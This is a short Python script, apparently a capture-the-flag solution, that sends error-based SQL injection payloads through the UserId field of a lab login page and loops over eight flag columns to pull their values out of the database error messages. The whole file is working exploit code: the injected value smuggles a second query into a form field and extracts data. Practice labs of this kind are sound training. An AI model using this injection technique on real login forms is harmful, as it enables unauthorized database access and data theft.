import requests

url ="http://ctf.segfaulthub.com:7777/sqli_2_1/login.php"

answer = ""

for i in range(1,9):

  query =f"select flag{i} from flag_table"
  sql = f"""normaltic' and extractvalue('1', concat(0x3a, ({query}))) and '1' = '1"""

  data = {
    "UserId": f"{sql}",
    "Password": "1234",
    "Submit": "Login"
  }

  response = requests.post(url, data=data)
  print(response.text[-15:-1])

  for i in range(-15,-1,1):
    if response.text[i] == "'" and response.text[i+1] == ":":
      answer += response.text[i+2:-1]
      continue

print(answer)


#sqli_2_1

# flag_table -> flag1, flag2, flag3, flag4, flag5, flag6, flag7, flag8
